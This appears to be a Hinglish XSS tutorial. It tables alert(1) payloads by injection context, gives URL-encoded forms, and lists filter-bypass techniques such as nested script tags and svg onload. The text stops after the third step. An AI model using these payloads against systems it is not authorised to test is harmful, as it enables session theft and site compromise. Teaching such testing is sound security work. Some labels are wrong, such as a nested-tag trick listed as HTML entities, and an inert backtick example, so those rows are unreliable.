# XSS Intermediate Level
Yahan se tu seekhega:

- Different XSS contexts kya hote hain
- Encoded payloads kahan use karne hain
- Bypass techniques kya hoti hain
- Real websites jese input fields mein XSS kaise test karte hain
- BurpSuite mein XSS detection kaise hota hai

---

### ;✅ Step 1: XSS Contexts — Kahan kaunsa payload use hota hai?

| 🔍 Context         | Reflection jahan hoti hai       | Example Payload             |
| ------------------ | ------------------------------- | --------------------------- |
| HTML Context       | `<div>input_here</div>`         | `<script>alert(1)</script>` |
| Attribute Context  | `<img src="input_here">`        | `x" onerror="alert(1)`      |
| JavaScript Context | `var a = "input_here"`          | `";alert(1);//`             |
| URL Context        | `<a href="input_here">`         | `javascript:alert(1)`       |
| Event Handler      | `<button onclick="input_here">` | `alert(1)`                  |

---

### Step 2: Encoding — Jab tag block ho to encoding se kaam chalate hain

| Payload                 | Encoded                         |
| ----------------------- | ------------------------------- |
| `<script>`              | `%3Cscript%3E`                  |
| `"`                     | `%22`                           |
| `'`                     | `%27`                           |
| `<svg onload=alert(1)>` | `%3Csvg%20onload%3Dalert(1)%3E` |

---

### Step 3: XSS Bypass Techniques


| Technique                                 | Example                                                           |
| ----------------------------------------- | ----------------------------------------------------------------- |
| Using HTML entities                       | `<scr<script>ipt>alert(1)</scr<script>ipt>`                       |
| Breaking out of attributes                | `x" onmouseover="alert(1)`                                        |
| Using different tags                      | `<svg/onload=alert(1)>`, `<math><mi//xlink:href="data:x"></math>` |
| Using backticks (template literals) in JS | `` `alert(1)` ``                                                  |

---